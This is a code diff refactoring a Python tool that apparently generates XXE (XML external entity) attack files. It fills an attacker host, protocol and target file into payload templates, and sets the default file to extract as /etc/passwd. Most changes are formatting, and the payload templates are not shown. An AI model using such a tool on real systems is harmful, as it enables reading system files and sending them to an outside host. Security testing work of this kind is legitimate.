@@ -22,7 +22,9 @@ filetypes = {
 
 
 class XXeFile:
-    def __init__(self, host, protocol, filetype, payload, outfile=None, exfile=None):
+    def __init__(
+        self, host, protocol, filetype, payload, outfile=None, exfile=None
+    ):
         if not host:
             raise KeyError("Please specify a valid host")
         if not protocol:
@@ -31,8 +33,6 @@ class XXeFile:
             raise KeyError("Please specify a valid filetype")
         if not payload:
             raise KeyError("Please specify a valid payload")
-        if not exfile:
-            exfile = "/etc/passwd" 
         if not filetype in filetypes:
             raise KeyError("Please specify a valid filetype")
         if not payload in payloads:
@@ -51,17 +51,13 @@ class XXeFile:
         with open(self.template, "rb") as tmpl:
             tempdat = tmpl.read().decode("utf8")
             if "__HOST__" in self.payload:
-                self.payload = self.payload.replace(
-                    "__HOST__", self.host
-                )
+                self.payload = self.payload.replace("__HOST__", self.host)
             if "__PROTOCOL__" in self.payload:
                 self.payload = self.payload.replace(
                     "__PROTOCOL__", self.protocol
                 )
             if "__EXFILE__" in self.payload:
-                self.payload = self.payload.replace(
-                    "__EXFILE__", self.exfile
-                )
+                self.payload = self.payload.replace("__EXFILE__", self.exfile)
             tempdat = tempdat.replace("__PAYLOAD__", self.payload)
             return tempdat
 
@@ -100,12 +96,21 @@ def main():
         "--outfile", type=str, help="The outfile to use in your outfiles"
     )
     parser.add_argument(
-        "--exfile", type=str, required=False, help="The file you want to extract"
+        "--exfile",
+        type=str,
+        required=False,
+        help="The file you want to extract",
+        default="/etc/passwd",
     )
     args = parser.parse_args()
 
     obj = XXeFile(
-        args.host, args.protocol, args.type, args.payload, args.outfile, args.exfile
+        args.host,
+        args.protocol,
+        args.type,
+        args.payload,
+        args.outfile,
+        args.exfile,
     )
 
     if obj.outfile is None:
